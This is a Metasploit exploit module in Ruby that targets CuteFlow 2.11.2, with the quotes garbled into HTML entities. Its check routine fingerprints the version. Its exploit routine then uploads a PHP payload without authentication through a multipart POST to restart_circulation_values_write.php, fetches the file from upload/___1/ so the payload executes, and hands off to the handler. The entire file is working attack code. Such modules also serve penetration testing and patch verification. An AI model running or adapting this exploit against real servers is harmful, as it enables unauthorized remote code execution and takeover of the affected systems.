# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "CuteFlow v2.11.2 Arbitrary File Upload Vulnerability",
            &#039;Description&#039;    => %q{
                This module exploits a vulnerability in CuteFlow version 2.11.2 or prior.
                This application has an upload feature that allows an unauthenticated
                user to upload arbitrary files to the &#039;upload/___1/&#039; directory
                and then execute it.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Discovery and exploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://itsecuritysolutions.org/2012-07-01-CuteFlow-2.11.2-multiple-security-vulnerabilities/&#039;]
                    #[&#039;OSVDB&#039;, &#039;&#039;],
                    #[&#039;EDB&#039;,   &#039;&#039;],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jul 27 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/cuteflow_v.2.11.2/&#039;])
            ], self.class)
    end
 
    def check
 
        base  = target_uri.path
        base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{base}"
        })
 
        if res.body =~ /\<strong style\=\"font\-size\:8pt\;font\-weight\:normal\"\>Version 2\.11\.2\<\/strong\>\<br\>/
            return Exploit::CheckCode::Vulnerable
        elsif res.body =~ /\<a href\=\"http\:\/\/cuteflow\.org" target\=\"\_blank\"\>/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
 
    end
 
    def upload(base, fname, file)
 
        # construct post data
        boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(10)}"
        data_post  = "--#{boundary}\r\n"
        data_post << "Content-Disposition: form-data; name=\"attachment1\"; filename=\"#{fname}\"\r\n"
        data_post << "Content-Type: text/php\r\n"
        data_post << "\r\n"
        data_post << file
        data_post << "\r\n"
        data_post << "--#{boundary}\r\n"
 
        # upload
        res = send_request_cgi({
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => "#{base}pages/restart_circulation_values_write.php",
            &#039;ctype&#039;   => "multipart/form-data; boundary=#{boundary}",
            &#039;data&#039;    => data_post,
        })
 
        return res
    end
 
    def exploit
        base  = target_uri.path
        base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
        @peer = "#{rhost}:#{rport}"
 
        # upload PHP payload to upload/___1/
        print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length.to_s} bytes)")
        fname = rand_text_alphanumeric(rand(10)+6) + &#039;.php&#039;
        php   = %Q|<?php #{payload.encoded} ?>|
        res   = upload(base, fname, php)
        if res.nil?
            print_error("#{@peer} - Uploading PHP payload failed")
            return
        end
 
        # retrieve and execute PHP payload
        print_status("#{@peer} - Retrieving file: #{fname}")
        send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{base}upload/___1/#{fname}"
        })
 
        handler
    end
end



